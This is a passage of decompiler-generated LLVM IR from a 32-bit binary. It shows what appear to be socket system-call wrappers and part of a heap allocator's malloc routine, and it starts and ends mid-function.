  %v2_804d94a = call i32 @function_804f368(i32 2, i32 %v2_804d943)
  ret i32 %v2_804d94a

; uselistorder directives
  uselistorder i32* %stack_var_-12, { 1, 0 }
}

define i32 @function_804d954(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_804d954:
  %stack_var_-12 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-12, align 4
  %v2_804d96f = ptrtoint i32* %stack_var_-12 to i32
  %v2_804d976 = call i32 @function_804f368(i32 3, i32 %v2_804d96f)
  ret i32 %v2_804d976

; uselistorder directives
  uselistorder i32* %stack_var_-12, { 1, 0 }
}

define i32 @function_804d980(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_804d980:
  %stack_var_-8 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-8, align 4
  %v2_804d993 = ptrtoint i32* %stack_var_-8 to i32
  %v2_804d99a = call i32 @function_804f368(i32 4, i32 %v2_804d993)
  ret i32 %v2_804d99a

; uselistorder directives
  uselistorder i32* %stack_var_-8, { 1, 0 }
}

define i32 @function_804d9a4(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_804d9a4:
  %stack_var_-16 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-16, align 4
  %v2_804d9c7 = ptrtoint i32* %stack_var_-16 to i32
  %v2_804d9ce = call i32 @function_804f368(i32 10, i32 %v2_804d9c7)
  ret i32 %v2_804d9ce

; uselistorder directives
  uselistorder i32* %stack_var_-16, { 1, 0 }
}

define i32 @function_804d9d8(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_804d9d8:
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-24, align 4
  %v2_804da0b = ptrtoint i32* %stack_var_-24 to i32
  %v2_804da12 = call i32 @function_804f368(i32 11, i32 %v2_804da0b)
  ret i32 %v2_804da12

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0 }
}

define i32 @function_804da1c(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_804da1c:
  %stack_var_-20 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-20, align 4
  %v2_804da47 = ptrtoint i32* %stack_var_-20 to i32
  %v2_804da4e = call i32 @function_804f368(i32 14, i32 %v2_804da47)
  ret i32 %v2_804da4e

; uselistorder directives
  uselistorder i32* %stack_var_-20, { 1, 0 }
}

define i32 @function_804da58(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_804da58:
  %stack_var_-12 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-12, align 4
  %v2_804da73 = ptrtoint i32* %stack_var_-12 to i32
  %v2_804da7a = call i32 @function_804f368(i32 1, i32 %v2_804da73)
  ret i32 %v2_804da7a

; uselistorder directives
  uselistorder i32* %stack_var_-12, { 1, 0 }
}

define i32 @function_804da84() local_unnamed_addr {
dec_label_pc_804da84:
  %v0_804da84 = load i32, i32* @eax, align 4
  %v6_804da97 = icmp ugt i32 %v0_804da84, 16777215
  br i1 %v6_804da97, label %dec_label_pc_804daa8, label %dec_label_pc_804da99

dec_label_pc_804da99:                             ; preds = %dec_label_pc_804da84
  %tmp = icmp ult i32 %v0_804da84, 256
  %v2_804da86 = udiv i32 %v0_804da84, 256
  %v2_804da99 = call i32 @llvm.ctlz.i32(i32 %v2_804da86, i1 true)
  %v3_804da99 = xor i32 %v2_804da99, 31
  %v5_804da99 = select i1 %tmp, i32 95, i32 %v3_804da99
  %v1_804da9c = add nuw nsw i32 %v5_804da99, 6
  store i32 %v1_804da9c, i32* @ecx, align 4
  %v2_804da9f = urem i32 %v1_804da9c, 32
  %v4_804da9f = icmp eq i32 %v2_804da9f, 0
  br i1 %v4_804da9f, label %bb4, label %bb

bb:                                               ; preds = %dec_label_pc_804da99
  %v5_804da9f = lshr i32 %v0_804da84, %v2_804da9f
  br label %bb4

bb4:                                              ; preds = %dec_label_pc_804da99, %bb
  %v0_804daa1 = phi i32 [ %v0_804da84, %dec_label_pc_804da99 ], [ %v5_804da9f, %bb ]
  %v1_804daa1 = urem i32 %v0_804daa1, 4
  %v2_804daa4 = mul nuw nsw i32 %v5_804da99, 4
  %v3_804daa4 = or i32 %v1_804daa1, 32
  %v4_804daa4 = add nuw nsw i32 %v3_804daa4, %v2_804daa4
  br label %dec_label_pc_804daa8

dec_label_pc_804daa8:                             ; preds = %dec_label_pc_804da84, %bb4
  %v0_804daa9 = phi i32 [ 95, %dec_label_pc_804da84 ], [ %v4_804daa4, %bb4 ]
  ret i32 %v0_804daa9

; uselistorder directives
  uselistorder i32 %v2_804da9f, { 1, 0 }
  uselistorder i32 %v0_804da84, { 2, 3, 1, 0, 4 }
  uselistorder label %dec_label_pc_804daa8, { 1, 0 }
  uselistorder label %bb4, { 1, 0 }
}

define i32 @function_804daaa(i32 %arg1) local_unnamed_addr {
dec_label_pc_804daaa:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-92 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_804daaa = load i32, i32* @ebp, align 4
  %v0_804daab = load i32, i32* @edi, align 4
  %v0_804daac = load i32, i32* @esi, align 4
  %v0_804daad = load i32, i32* @ebx, align 4
  store i32 %v0_804daad, i32* %stack_var_-16, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v2_804dabf = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_804dabf, i32* @eax, align 4
  store i32 %v2_804dabf, i32* %stack_var_-92, align 4
  %v2_804dac4 = call i32 @function_804f016(i32 %v2_804dabf, i32 134541331)
  store i32 %v2_804dac4, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_8055c90.139 to i32), i32* %stack_var_-92, align 4
  %v1_804dad0 = call i32 @function_804f013(i32 ptrtoint (i32* @global_var_8055c90.139 to i32))
  store i32 %v1_804dad0, i32* %eax.global-to-local, align 4
  %v0_804dad8 = load i32, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v0_804dad8, -32
  br i1 %tmp, label %dec_label_pc_804daef, label %dec_label_pc_804dadd

dec_label_pc_804dadd:                             ; preds = %dec_label_pc_804daaa
  %v0_804dadd = load i32, i32* %stack_var_-92, align 4
  %v1_804dadd = call i32 @function_804b7f4(i32 %v0_804dadd)
  store i32 %v1_804dadd, i32* %eax.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v1_804dae4 = inttoptr i32 %v1_804dadd to i32*
  store i32 12, i32* %v1_804dae4, align 4
  br label %dec_label_pc_804e242

dec_label_pc_804daef:                             ; preds = %dec_label_pc_804daaa
  %v1_804daef = add i32 %v0_804dad8, 11
  %tmp128 = icmp ult i32 %v1_804daef, 16
  br i1 %tmp128, label %dec_label_pc_804db06, label %dec_label_pc_804daff

dec_label_pc_804daff:                             ; preds = %dec_label_pc_804daef
  %v1_804daff = and i32 %v1_804daef, -8
  br label %dec_label_pc_804db06

dec_label_pc_804db06:                             ; preds = %dec_label_pc_804daef, %dec_label_pc_804daff
  %storemerge125 = phi i32 [ %v1_804daff, %dec_label_pc_804daff ], [ %v1_804daef, %dec_label_pc_804daef ]
  %v1_804dea6 = phi i32 [ %v1_804daff, %dec_label_pc_804daff ], [ 16, %dec_label_pc_804daef ]
  store i32 %storemerge125, i32* %eax.global-to-local, align 4
  %v0_804db06 = load i8, i8* @global_var_8058700.140, align 1
  %v1_804db06 = sext i8 %v0_804db06 to i32
  store i32 %v1_804db06, i32* @ebx, align 4
  %v3_804db0c = urem i8 %v0_804db06, 2
  %v4_804db0c = icmp eq i8 %v3_804db0c, 0
  %v1_804db0f = icmp eq i1 %v4_804db0c, false
  br i1 %v1_804db0f, label %dec_label_pc_804db2e, label %dec_label_pc_804db11

dec_label_pc_804db11:                             ; preds = %dec_label_pc_804db06
  %v2_804db11 = icmp eq i8 %v0_804db06, 0
  %v1_804db13 = icmp eq i1 %v2_804db11, false
  br i1 %v1_804db13, label %dec_label_pc_804de11, label %dec_label_pc_804db19

dec_label_pc_804db19:                             ; preds = %dec_label_pc_804db11
  store i32 ptrtoint (i8* @global_var_8058700.140 to i32), i32* %stack_var_-92, align 4
  %v2_804db21 = call i32 @function_804e2d9(i32* bitcast (i8* @global_var_8058700.140 to i32*))
  store i32 %v2_804db21, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804de11

dec_label_pc_804db2e:                             ; preds = %dec_label_pc_804db06
  %v11_804db2e = trunc i32 %v1_804dea6 to i8
  %v8_804db32 = icmp ugt i8 %v11_804db2e, %v0_804db06
  br i1 %v8_804db32, label %dec_label_pc_804db4f, label %dec_label_pc_804db34

dec_label_pc_804db34:                             ; preds = %dec_label_pc_804db2e
  %v2_804db38 = udiv i32 %v1_804dea6, 2
  store i32 %v2_804db38, i32* %eax.global-to-local, align 4
  %v1_804db3a = add i32 %v2_804db38, ptrtoint (i8* @global_var_8058700.140 to i32)
  store i32 %v1_804db3a, i32* @ecx, align 4
  %v1_804db40 = add i32 %v2_804db38, add (i32 ptrtoint (i8* @global_var_8058700.140 to i32), i32 -4)
  %v2_804db40 = inttoptr i32 %v1_804db40 to i32*
  %v3_804db40 = load i32, i32* %v2_804db40, align 4
  store i32 %v3_804db40, i32* @edx, align 4
  %v1_804db43 = icmp eq i32 %v3_804db40, 0
  br i1 %v1_804db43, label %dec_label_pc_804db4f, label %dec_label_pc_804db47

dec_label_pc_804db47:                             ; preds = %dec_label_pc_804db34
  %v1_804db47 = add i32 %v3_804db40, 8
  %v2_804db47 = inttoptr i32 %v1_804db47 to i32*
  %v3_804db47 = load i32, i32* %v2_804db47, align 4
  store i32 %v3_804db47, i32* %eax.global-to-local, align 4
  store i32 %v3_804db47, i32* %v2_804db40, align 4
  br label %dec_label_pc_804db88

dec_label_pc_804db4f:                             ; preds = %dec_label_pc_804db34, %dec_label_pc_804db2e
  %v8_804db4f = icmp ult i32 %v1_804dea6, 255
  %v6_804db57 = icmp ugt i32 %v1_804dea6, 255
  store i32 %v1_804dea6, i32* @eax, align 4
  br i1 %v6_804db57, label %dec_label_pc_804db90, label %dec_label_pc_804db59

dec_label_pc_804db59:                             ; preds = %dec_label_pc_804db4f
  %v2_804db5d = udiv i32 %v1_804dea6, 8
  store i32 %v2_804db5d, i32* %eax.global-to-local, align 4
  %v1_804db60 = mul nuw i32 %v2_804db5d, 8
  %v2_804db60 = add i32 %v1_804db60, ptrtoint (i32* @global_var_805872c.141 to i32)
  store i32 %v2_804db60, i32* @ecx, align 4
  %v1_804db6b = add i32 %v1_804db60, add (i32 ptrtoint (i32* @global_var_805872c.141 to i32), i32 12)
  %v2_804db6b = inttoptr i32 %v1_804db6b to i32*
  %v3_804db6b = load i32, i32* %v2_804db6b, align 4
  store i32 %v3_804db6b, i32* @edx, align 4
  %v12_804db6e = icmp eq i32 %v3_804db6b, %v2_804db60
  br i1 %v12_804db6e, label %dec_label_pc_804dc8c.preheader, label %dec_label_pc_804db76

dec_label_pc_804db76:                             ; preds = %dec_label_pc_804db59
  store i32 %v1_804dea6, i32* %ebx.global-to-local, align 4
  %v1_804db7a = add i32 %v3_804db6b, 12
  %v2_804db7a = inttoptr i32 %v1_804db7a to i32*
  %v3_804db7a = load i32, i32* %v2_804db7a, align 4
  store i32 %v3_804db7a, i32* %eax.global-to-local, align 4
  %v2_804db7d = or i32 %v1_804dea6, 4
  %v3_804db7d = add i32 %v3_804db6b, %v2_804db7d
  %v4_804db7d = inttoptr i32 %v3_804db7d to i32*
  %v5_804db7d = load i32, i32* %v4_804db7d, align 4
  %v6_804db7d = or i32 %v5_804db7d, 1
  store i32 %v6_804db7d, i32* %v4_804db7d, align 4
  %v0_804db82 = load i32, i32* %eax.global-to-local, align 4
  %v1_804db82 = load i32, i32* @ecx, align 4
  %v2_804db82 = add i32 %v1_804db82, 12
  %v3_804db82 = inttoptr i32 %v2_804db82 to i32*
  store i32 %v0_804db82, i32* %v3_804db82, align 4
  %v0_804db85 = load i32, i32* @ecx, align 4
  %v1_804db85 = load i32, i32* %eax.global-to-local, align 4
  %v2_804db85 = add i32 %v1_804db85, 8
  %v3_804db85 = inttoptr i32 %v2_804db85 to i32*
  store i32 %v0_804db85, i32* %v3_804db85, align 4
  br label %dec_label_pc_804db88

dec_label_pc_804db88:                             ; preds = %dec_label_pc_804db47, %dec_label_pc_804db76
  %v0_804db88 = load i32, i32* @edx, align 4
  %v1_804db88 = add i32 %v0_804db88, 8
  store i32 %v1_804db88, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804e231

dec_label_pc_804db90:                             ; preds = %dec_label_pc_804db4f
  %v0_804db94 = call i32 @function_804da84()
  store i32 %v0_804db94, i32* %eax.global-to-local, align 4
  %v3_804db99 = and i8 %v0_804db06, 2
  %v4_804db99 = icmp eq i8 %v3_804db99, 0
  br i1 %v4_804db99, label %dec_label_pc_804dc8c.preheader, label %dec_label_pc_804dba6

dec_label_pc_804dba6:                             ; preds = %dec_label_pc_804db90
  store i32 ptrtoint (i8* @global_var_8058700.140 to i32), i32* %stack_var_-92, align 4
  %v2_804dbae = call i32 @function_804e2d9(i32* bitcast (i8* @global_var_8058700.140 to i32*))
  store i32 %v2_804dbae, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804dc8c.preheader

dec_label_pc_804dc8c.preheader:                   ; preds = %dec_label_pc_804dba6, %dec_label_pc_804db59, %dec_label_pc_804db90
  %stack_var_-40.0.ph = phi i32 [ %v2_804db5d, %dec_label_pc_804db59 ], [ %v0_804db94, %dec_label_pc_804dba6 ], [ %v0_804db94, %dec_label_pc_804db90 ]
  %v1_804dbe2 = add i32 %v1_804dea6, 16
  %v0_804dc8c107 = load i32, i32* @global_var_8058740.144, align 64
  store i32 %v0_804dc8c107, i32* @ebp, align 4
  %v9_804dc92110 = icmp eq i32 %v0_804dc8c107, 134580020
  %v1_804dc98112 = icmp eq i1 %v9_804dc92110, false
  br i1 %v1_804dc98112, label %dec_label_pc_804dbbb, label %dec_label_pc_804dc9e

dec_label_pc_804dbbb:                             ; preds = %dec_label_pc_804dc8c.preheader, %bb82
  %v0_804dc8c113 = phi i32 [ %v0_804dc8c, %bb82 ], [ %v0_804dc8c107, %dec_label_pc_804dc8c.preheader ]
  %v1_804dbbb = add i32 %v0_804dc8c113, 4
  %v2_804dbbb = inttoptr i32 %v1_804dbbb to i32*
  %v3_804dbbb = load i32, i32* %v2_804dbbb, align 4
  %v1_804dbbe = add i32 %v0_804dc8c113, 12
  %v2_804dbbe = inttoptr i32 %v1_804dbbe to i32*
  %v3_804dbbe = load i32, i32* %v2_804dbbe, align 4
  store i32 %v3_804dbbe, i32* @edx, align 4
  %v1_804dbc1 = and i32 %v3_804dbbb, -4
  store i32 %v1_804dbc1, i32* @edi, align 4
  br i1 %v6_804db57, label %dec_label_pc_804dbed, label %dec_label_pc_804dbce

dec_label_pc_804dbce:                             ; preds = %dec_label_pc_804dbbb
  %v9_804dbce = icmp eq i32 %v3_804dbbe, 134580020
  %v1_804dbd4 = icmp eq i1 %v9_804dbce, false
  br i1 %v1_804dbd4, label %dec_label_pc_804dbed, label %dec_label_pc_804dbd6

dec_label_pc_804dbd6:                             ; preds = %dec_label_pc_804dbce
  %v1_804dbd6 = load i32, i32* @global_var_8058730.142, align 16
  %v12_804dbd6 = icmp eq i32 %v0_804dc8c113, %v1_804dbd6
  %v1_804dbdc = icmp eq i1 %v12_804dbd6, false
  br i1 %v1_804dbdc, label %dec_label_pc_804dbed, label %dec_label_pc_804dbde

dec_label_pc_804dbde:                             ; preds = %dec_label_pc_804dbd6
  store i32 %v1_804dbe2, i32* %eax.global-to-local, align 4
  %v6_804dbe7 = icmp ugt i32 %v1_804dbc1, %v1_804dbe2
  br i1 %v6_804dbe7, label %dec_label_pc_804e1cc, label %dec_label_pc_804dbed

dec_label_pc_804dbed:                             ; preds = %dec_label_pc_804dbde, %dec_label_pc_804dbd6, %dec_label_pc_804dbce, %dec_label_pc_804dbbb
  store i32 ptrtoint (i32* @global_var_8058734.143 to i32), i32* %eax.global-to-local, align 4
  store i32 %v3_804dbbe, i32* @global_var_8058740.144, align 4
  %v2_804dbf5 = add i32 %v3_804dbbe, 8
  %v3_804dbf5 = inttoptr i32 %v2_804dbf5 to i32*
  store i32 ptrtoint (i32* @global_var_8058734.143 to i32), i32* %v3_804dbf5, align 4
  %v0_804dbf8 = load i32, i32* @edi, align 4
  %v15_804dbf8 = icmp eq i32 %v0_804dbf8, %v1_804dea6
  br i1 %v15_804dbf8, label %dec_label_pc_804e20d, label %dec_label_pc_804dc02

dec_label_pc_804dc02:                             ; preds = %dec_label_pc_804dbed
  %v6_804dc08 = icmp ugt i32 %v0_804dbf8, 255
  br i1 %v6_804dc08, label %dec_label_pc_804dc1b, label %dec_label_pc_804dc0a

dec_label_pc_804dc0a:                             ; preds = %dec_label_pc_804dc02
  %v2_804dc0c = udiv i32 %v0_804dbf8, 8
  store i32 %v2_804dc0c, i32* %esi.global-to-local, align 4
  %v1_804dc0f = mul nuw i32 %v2_804dc0c, 8
  %v2_804dc0f = add i32 %v1_804dc0f, 134580012
  store i32 %v2_804dc0f, i32* @ebx, align 4
  %v1_804dc16 = add i32 %v1_804dc0f, 134580020
  %v2_804dc16 = inttoptr i32 %v1_804dc16 to i32*
  %v3_804dc16 = load i32, i32* %v2_804dc16, align 4
  store i32 %v3_804dc16, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804dc64

dec_label_pc_804dc1b:                             ; preds = %dec_label_pc_804dc02
  store i32 %v0_804dbf8, i32* @eax, align 4
  %v0_804dc1d = call i32 @function_804da84()
  store i32 %v0_804dc1d, i32* %esi.global-to-local, align 4
  %v1_804dc24 = mul i32 %v0_804dc1d, 8
  %v2_804dc24 = add i32 %v1_804dc24, ptrtoint (i32* @global_var_805872c.141 to i32)
  store i32 %v2_804dc24, i32* %eax.global-to-local, align 4
  %v1_804dc2b = add i32 %v1_804dc24, add (i32 ptrtoint (i32* @global_var_805872c.141 to i32), i32 8)
  %v2_804dc2b = inttoptr i32 %v1_804dc2b to i32*
  %v3_804dc2b = load i32, i32* %v2_804dc2b, align 4
  store i32 %v3_804dc2b, i32* %edx.global-to-local, align 4
  %v12_804dc2e = icmp eq i32 %v3_804dc2b, %v2_804dc24
  store i32 %v3_804dc2b, i32* @ebx, align 4
  br i1 %v12_804dc2e, label %dec_label_pc_804dc64, label %dec_label_pc_804dc38

dec_label_pc_804dc38:                             ; preds = %dec_label_pc_804dc1b
  %v1_804dc38 = add i32 %v1_804dc24, add (i32 ptrtoint (i32* @global_var_805872c.141 to i32), i32 12)
  %v2_804dc38 = inttoptr i32 %v1_804dc38 to i32*
  %v3_804dc38 = load i32, i32* %v2_804dc38, align 4
  store i32 %v3_804dc38, i32* @ebx, align 4
  %v0_804dc3b = load i32, i32* @edi, align 4
  %v2_804dc3b = add i32 %v3_804dc38, 4
  %v3_804dc3b = inttoptr i32 %v2_804dc3b to i32*
  %v4_804dc3b = load i32, i32* %v3_804dc3b, align 4
  %v10_804dc3b = icmp ult i32 %v0_804dc3b, %v4_804dc3b
  %v1_804dc3e = icmp eq i1 %v10_804dc3b, false
  br i1 %v1_804dc3e, label %dec_label_pc_804dc46, label %dec_label_pc_804dc64

dec_label_pc_804dc46:                             ; preds = %dec_label_pc_804dc38
  %v1_804dc48 = or i32 %v0_804dc3b, 1
  store i32 %v1_804dc48, i32* %eax.global-to-local, align 4
  store i32 %v3_804dc2b, i32* %ebx.global-to-local, align 4
  %v2_804dc5c100 = add i32 %v3_804dc2b, 4
  %v3_804dc5c101 = inttoptr i32 %v2_804dc5c100 to i32*
  %v4_804dc5c102 = load i32, i32* %v3_804dc5c101, align 4
  %v10_804dc5c104 = icmp ult i32 %v1_804dc48, %v4_804dc5c102
  br i1 %v10_804dc5c104, label %dec_label_pc_804dc4d, label %dec_label_pc_804dc61

dec_label_pc_804dc4d:                             ; preds = %dec_label_pc_804dc46, %dec_label_pc_804dc4d
  %v0_804dc61105 = phi i32 [ %v3_804dc51, %dec_label_pc_804dc4d ], [ %v3_804dc2b, %dec_label_pc_804dc46 ]
  store i32 %v0_804dc61105, i32* %ecx.global-to-local, align 4
  %v1_804dc51 = add i32 %v0_804dc61105, 8
  %v2_804dc51 = inttoptr i32 %v1_804dc51 to i32*
  %v3_804dc51 = load i32, i32* %v2_804dc51, align 4
  store i32 %v3_804dc51, i32* %ecx.global-to-local, align 4
  store i32 %v3_804dc51, i32* %ebx.global-to-local, align 4
  %v2_804dc5c = add i32 %v3_804dc51, 4
  %v3_804dc5c = inttoptr i32 %v2_804dc5c to i32*
  %v4_804dc5c = load i32, i32* %v3_804dc5c, align 4
  %v10_804dc5c = icmp ult i32 %v1_804dc48, %v4_804dc5c
  br i1 %v10_804dc5c, label %dec_label_pc_804dc4d, label %dec_label_pc_804dc61

dec_label_pc_804dc61:                             ; preds = %dec_label_pc_804dc4d, %dec_label_pc_804dc46
  %v0_804dc61.lcssa = phi i32 [ %v3_804dc2b, %dec_label_pc_804dc46 ], [ %v3_804dc51, %dec_label_pc_804dc4d ]
  %v1_804dc61 = add i32 %v0_804dc61.lcssa, 12
  %v2_804dc61 = inttoptr i32 %v1_804dc61 to i32*
  %v3_804dc61 = load i32, i32* %v2_804dc61, align 4
  store i32 %v3_804dc61, i32* @ebx, align 4
  br label %dec_label_pc_804dc64

dec_label_pc_804dc64:                             ; preds = %dec_label_pc_804dc0a, %dec_label_pc_804dc38, %dec_label_pc_804dc1b, %dec_label_pc_804dc61
  %v0_804dc64 = phi i32 [ %v0_804dc1d, %dec_label_pc_804dc1b ], [ %v0_804dc1d, %dec_label_pc_804dc61 ], [ %v0_804dc1d, %dec_label_pc_804dc38 ], [ %v2_804dc0c, %dec_label_pc_804dc0a ]
  %stack_var_-64.1 = phi i32 [ %v3_804dc2b, %dec_label_pc_804dc1b ], [ %v0_804dc61.lcssa, %dec_label_pc_804dc61 ], [ %v2_804dc24, %dec_label_pc_804dc38 ], [ %v3_804dc16, %dec_label_pc_804dc0a ]
  %v1_804dc66 = urem i32 %v0_804dc64, 32
  %v2_804dc66 = icmp eq i32 %v1_804dc66, 0
  store i32 %v1_804dc66, i32* %esi.global-to-local, align 4
  store i32 %v1_804dc66, i32* @ecx, align 4
  store i32 1, i32* %eax.global-to-local, align 4
  %v2_804dc70 = sdiv i32 %v0_804dc64, 32
  store i32 %v2_804dc70, i32* %edx.global-to-local, align 4
  br i1 %v2_804dc66, label %bb82, label %bb

bb:                                               ; preds = %dec_label_pc_804dc64
  %v5_804dc73 = shl i32 1, %v1_804dc66
  store i32 %v5_804dc73, i32* %eax.global-to-local, align 4
  br label %bb82

bb82:                                             ; preds = %dec_label_pc_804dc64, %bb
  %v5_804dc75 = phi i32 [ 1, %dec_label_pc_804dc64 ], [ %v5_804dc73, %bb ]
  %v1_804dc75 = mul nsw i32 %v2_804dc70, 4
  %v2_804dc75 = add i32 %v1_804dc75, ptrtoint (i32* @global_var_8058a34.145 to i32)
  %v3_804dc75 = inttoptr i32 %v2_804dc75 to i32*
  %v4_804dc75 = load i32, i32* %v3_804dc75, align 4
  %v6_804dc75 = or i32 %v4_804dc75, %v5_804dc75
  store i32 %v6_804dc75, i32* %v3_804dc75, align 4
  %v0_804dc7c = load i32, i32* @ebx, align 4
  %v1_804dc7c = load i32, i32* @ebp, align 4
  %v2_804dc7c = add i32 %v1_804dc7c, 12
  %v3_804dc7c = inttoptr i32 %v2_804dc7c to i32*
  store i32 %v0_804dc7c, i32* %v3_804dc7c, align 4
  store i32 %stack_var_-64.1, i32* @esi, align 4
  %v1_804dc83 = load i32, i32* @ebp, align 4
  %v2_804dc83 = add i32 %v1_804dc83, 8
  %v3_804dc83 = inttoptr i32 %v2_804dc83 to i32*
  store i32 %stack_var_-64.1, i32* %v3_804dc83, align 4
  %v0_804dc86 = load i32, i32* @ebp, align 4
  %v1_804dc86 = load i32, i32* @esi, align 4
  %v2_804dc86 = add i32 %v1_804dc86, 12
  %v3_804dc86 = inttoptr i32 %v2_804dc86 to i32*
  store i32 %v0_804dc86, i32* %v3_804dc86, align 4
  %v0_804dc89 = load i32, i32* @ebp, align 4
  %v1_804dc89 = load i32, i32* @ebx, align 4
  %v2_804dc89 = add i32 %v1_804dc89, 8
  %v3_804dc89 = inttoptr i32 %v2_804dc89 to i32*
  store i32 %v0_804dc89, i32* %v3_804dc89, align 4
  %v0_804dc8c = load i32, i32* @global_var_8058740.144, align 64
  store i32 %v0_804dc8c, i32* @ebp, align 4
  %v9_804dc92 = icmp eq i32 %v0_804dc8c, 134580020
  %v1_804dc98 = icmp eq i1 %v9_804dc92, false
  br i1 %v1_804dc98, label %dec_label_pc_804dbbb, label %dec_label_pc_804dc9e

dec_label_pc_804dc9e:                             ; preds = %bb82, %dec_label_pc_804dc8c.preheader
  br i1 %v8_804db4f, label %dec_label_pc_804dd2c, label %dec_label_pc_804dcac

dec_label_pc_804dcac:                             ; preds = %dec_label_pc_804dc9e
  store i32 %stack_var_-40.0.ph, i32* %eax.global-to-local, align 4
  %v1_804dcb0 = mul i32 %stack_var_-40.0.ph, 8
  %v2_804dcb0 = add i32 %v1_804dcb0, ptrtoint (i32* @global_var_805872c.141 to i32)
  store i32 %v2_804dcb0, i32* %edx.global-to-local, align 4
  %v1_804dcb7 = add i32 %v1_804dcb0, add (i32 ptrtoint (i32* @global_var_805872c.141 to i32), i32 12)
  %v2_804dcb7 = inttoptr i32 %v1_804dcb7 to i32*
  %storemerge1.pre = load i32, i32* %v2_804dcb7, align 4
  br label %dec_label_pc_804dd28

dec_label_pc_804dcbc:                             ; preds = %dec_label_pc_804dd28
  %v1_804dcbc = add i32 %v4_804dcd3, 4
  %v2_804dcbc = inttoptr i32 %v1_804dcbc to i32*
  %v3_804dcbc = load i32, i32* %v2_804dcbc, align 4
  store i32 %v3_804dcbc, i32* %ebx.global-to-local, align 4
  %v1_804dcbf = add i32 %v4_804dcd3, 12
  %v2_804dcbf = inttoptr i32 %v1_804dcbf to i32*
  %v3_804dcbf = load i32, i32* %v2_804dcbf, align 4
  store i32 %v3_804dcbf, i32* @ecx, align 4
  %v1_804dcc2 = and i32 %v3_804dcbc, -4
  store i32 %v1_804dcc2, i32* @ebx, align 4
  %v10_804dcc5 = icmp ult i32 %v1_804dcc2, %v1_804dea6
  br i1 %v10_804dcc5, label %dec_label_pc_804dd28, label %dec_label_pc_804dccb

dec_label_pc_804dccb:                             ; preds = %dec_label_pc_804dcbc
  %v1_804dccb = add i32 %v4_804dcd3, 8
  %v2_804dccb = inttoptr i32 %v1_804dccb to i32*
  %v3_804dccb = load i32, i32* %v2_804dccb, align 4
  store i32 %v3_804dccb, i32* @edx, align 4
  %v1_804dcce = add i32 %v3_804dccb, 12
  %v2_804dcce = inttoptr i32 %v1_804dcce to i32*
  %v3_804dcce = load i32, i32* %v2_804dcce, align 4
  %v15_804dcce = icmp eq i32 %v3_804dcce, %v4_804dcd3
  %v1_804dcd1 = icmp eq i1 %v15_804dcce, false
  br i1 %v1_804dcd1, label %dec_label_pc_804dcd8, label %dec_label_pc_804dcd3

dec_label_pc_804dcd3:                             ; preds = %dec_label_pc_804dccb
  %v1_804dcd3 = add i32 %v3_804dcbf, 8
  %v2_804dcd3 = inttoptr i32 %v1_804dcd3 to i32*
  %v3_804dcd3 = load i32, i32* %v2_804dcd3, align 4
  %v15_804dcd3 = icmp eq i32 %v3_804dcd3, %v4_804dcd3
  br i1 %v15_804dcd3, label %dec_label_pc_804dcdd, label %dec_label_pc_804dcd8

dec_label_pc_804dcd8:                             ; preds = %dec_label_pc_804dcd3, %dec_label_pc_804dccb
  %v0_804dcd8 = call i32 @function_804e640()
  store i32 %v0_804dcd8, i32* %eax.global-to-local, align 4
  %v0_804dcdd.pre = load i32, i32* @ebx, align 4
  %v0_804dce3.pre = load i32, i32* @ecx, align 4
  %v1_804dce3.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_804dcdd

dec_label_pc_804dcdd:                             ; preds = %dec_label_pc_804dcd3, %dec_label_pc_804dcd8
  %v1_804dce3 = phi i32 [ %v3_804dccb, %dec_label_pc_804dcd3 ], [ %v1_804dce3.pre, %dec_label_pc_804dcd8 ]
  %v0_804dce3 = phi i32 [ %v3_804dcbf, %dec_label_pc_804dcd3 ], [ %v0_804dce3.pre, %dec_label_pc_804dcd8 ]
  %v0_804dcdd = phi i32 [ %v1_804dcc2, %dec_label_pc_804dcd3 ], [ %v0_804dcdd.pre, %dec_label_pc_804dcd8 ]
  %v5_804dcdf = sub i32 %v0_804dcdd, %v1_804dea6
  store i32 %v5_804dcdf, i32* %esi.global-to-local, align 4
  %v2_804dce3 = add i32 %v1_804dce3, 12
  %v3_804dce3 = inttoptr i32 %v2_804dce3 to i32*
  store i32 %v0_804dce3, i32* %v3_804dce3, align 4
  %v0_804dce6 = load i32, i32* @edx, align 4
  %v1_804dce6 = load i32, i32* @ecx, align 4
  %v2_804dce6 = add i32 %v1_804dce6, 8
  %v3_804dce6 = inttoptr i32 %v2_804dce6 to i32*
  store i32 %v0_804dce6, i32* %v3_804dce6, align 4
  %v0_804dce9 = load i32, i32* %eax.global-to-local, align 4
  %v1_804dce9 = add i32 %v0_804dce9, 8
  store i32 %v1_804dce9, i32* @ecx, align 4
  %v0_804dcec = load i32, i32* %esi.global-to-local, align 4
